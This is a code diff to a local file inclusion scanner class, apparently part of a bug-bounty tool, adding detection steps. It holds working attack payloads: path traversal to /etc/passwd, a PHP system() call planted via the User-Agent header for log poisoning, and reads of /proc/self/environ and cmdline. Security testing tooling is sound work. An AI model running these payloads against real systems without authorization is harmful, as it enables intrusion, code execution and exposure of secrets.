@@ -151,6 +151,31 @@ class LFIScanner(ScannerBase):
                         )
             except Exception:
                 continue
+        if parameter.lower() in ("file", "path", "archive", "zip"):
+            zip_payloads = [
+                '../../../etc/passwd%00.zip',
+                '....//....//....//etc/passwd%00.zip',
+            ]
+            for payload in zip_payloads:
+                try:
+                    test_url = self._inject_param(url, parameter, payload)
+                    resp = safe_get(self.session, test_url, self.timeout)
+                    if resp:
+                        body = resp.text
+                        if not body:
+                            continue
+                        for sig in LFI_SIGNATURES:
+                            if sig in body and sig not in baseline_body:
+                                return DetectionResult(
+                                    url=test_url,
+                                    parameter=parameter,
+                                    payload=payload,
+                                    context=f"Zip slip LFI: {sig!r}",
+                                    raw_response=resp,
+                                    evidence_signals=[f"LFI: {sig} via zip slip"],
+                                )
+                except Exception:
+                    continue
         return None
 
     @staticmethod
@@ -275,11 +300,13 @@ class LFIScanner(ScannerBase):
     def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
         self._prepare_scan()
         raw_urls = self.recon.get("urls", []) if target_urls is None else target_urls
+        file_path_params = {"file", "path", "read", "include", "page", "document", "template", "log", "config", "dir", "load", "folder", "root", "base", "attachment", "download"}
         for url in raw_urls:
             if "?" not in url or not self._in_scope(url):
                 continue
             try:
                 params = list(parse_qs(urlparse(url).query).keys())
+                params.sort(key=lambda p: 0 if p.lower() in file_path_params else 1)
                 for param in params:
                     detection = self.detect(url, param)
                     if detection is None:
@@ -311,13 +338,105 @@ class LFIScanner(ScannerBase):
                         validation_result = self.validate(detection)
                         if validation_result and validation_result.confirmed:
                             f["verification_stage"] = VerificationStage.VALIDATED.value
+                            f["signals"] = 2
                         else:
                             f["verification_stage"] = VerificationStage.DETECTED.value
+                            f["signals"] = 1
+                        ev_count = 2
+                        if resp:
+                            det_headers = resp.headers
+                            is_php = (
+                                "X-Powered-By" in det_headers and "PHP" in det_headers.get("X-Powered-By", "")
+                            ) or ".php" in url or any(
+                                c.name == "PHPSESSID" for c in self.session.cookies
+                            )
+                            is_iis = "Microsoft-IIS" in det_headers.get("Server", "") or "x-aspnet-version" in det_headers
+                            if is_php and not is_iis:
+                                poison_url = url.split("?")[0]
+                                poison_headers = dict(self.session.headers)
+                                poison_headers["User-Agent"] = "<?php system('echo BBH_TEST_POISON'); ?>"
+                                poison_resp = safe_get(self.session, poison_url, self.timeout, headers=poison_headers)
+                                if poison_resp:
+                                    log_paths = [
+                                        "/var/log/apache2/access.log",
+                                        "/var/log/nginx/access.log",
+                                        "/var/log/httpd/access_log",
+                                        "/proc/self/environ",
+                                    ]
+                                    for log_path in log_paths:
+                                        log_test_url = self._inject_param(url, param, log_path)
+                                        log_resp = safe_get(self.session, log_test_url, self.timeout)
+                                        if log_resp:
+                                            log_body = log_resp.text or ""
+                                            if "BBH_TEST_POISON" in log_body and "<?php" not in log_body:
+                                                f["verification_stage"] = VerificationStage.EXPLOITABLE.value
+                                                f["signals"] = 3
+                                                ev_count = 3
+                                                poison_ev = ResponseExcerptEvidence(
+                                                    excerpt=log_body[:500],
+                                                    length=len(log_body),
+                                                    context="log_poisoning",
+                                                )
+                                                f["evidence"].append(poison_ev)
+                                                self.evidence_engine.store(poison_ev)
+                                                self.evidence_engine.link_to_finding(poison_ev, f.get("fingerprint", ""))
+                                                break
+                        if f.get("signals", 0) < 3:
+                            proc_paths = [
+                                "/proc/self/cmdline",
+                                "/proc/self/environ",
+                                "/proc/self/fd/0",
+                            ]
+                            for proc_path in proc_paths:
+                                proc_test_url = self._inject_param(url, param, proc_path)
+                                proc_resp = safe_get(self.session, proc_test_url, self.timeout)
+                                if proc_resp:
+                                    proc_body = proc_resp.text or ""
+                                    if len(proc_body) > 5:
+                                        if proc_path == "/proc/self/environ" and ("HOME=" in proc_body or "PATH=" in proc_body):
+                                            f["verification_stage"] = VerificationStage.EXPLOITABLE.value
+                                            f["signals"] = 3
+                                            ev_count = 3
+                                            proc_ev = ResponseExcerptEvidence(
+                                                excerpt=proc_body[:500],
+                                                length=len(proc_body),
+                                                context="proc_environ",
+                                            )
+                                            f["evidence"].append(proc_ev)
+                                            self.evidence_engine.store(proc_ev)
+                                            self.evidence_engine.link_to_finding(proc_ev, f.get("fingerprint", ""))
+                                            break
+                                        elif proc_path == "/proc/self/cmdline" and ("\x00" in proc_body or "/" in proc_body):
+                                            f["verification_stage"] = VerificationStage.EXPLOITABLE.value
+                                            f["signals"] = 3
+                                            ev_count = 3
+                                            proc_ev = ResponseExcerptEvidence(
+                                                excerpt=proc_body[:500],
+                                                length=len(proc_body),
+                                                context="proc_cmdline",
+                                            )
+                                            f["evidence"].append(proc_ev)
+                                            self.evidence_engine.store(proc_ev)
+                                            self.evidence_engine.link_to_finding(proc_ev, f.get("fingerprint", ""))
+                                            break
+                                        elif proc_path == "/proc/self/fd/0" and len(proc_body) > 10:
+                                            f["verification_stage"] = VerificationStage.EXPLOITABLE.value
+                                            f["signals"] = 3
+                                            ev_count = 3
+                                            proc_ev = ResponseExcerptEvidence(
+                                                excerpt=proc_body[:500],
+                                                length=len(proc_body),
+                                                context="proc_fd0",
+                                            )
+                                            f["evidence"].append(proc_ev)
+                                            self.evidence_engine.store(proc_ev)
+                                            self.evidence_engine.link_to_finding(proc_ev, f.get("fingerprint", ""))
+                                            break
                         self.evidence_engine.store(req_ev)
                         self.evidence_engine.store(resp_ev)
                         self.evidence_engine.link_to_finding(req_ev, f.get("fingerprint", ""))
                         self.evidence_engine.link_to_finding(resp_ev, f.get("fingerprint", ""))
-                        self._enrich_finding(f, 2, f["verification_stage"])
+                        self._enrich_finding(f, ev_count, f["verification_stage"])
                         self._add_finding(f)
                     log(f"  [LFI] {detection.url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
             except Exception:
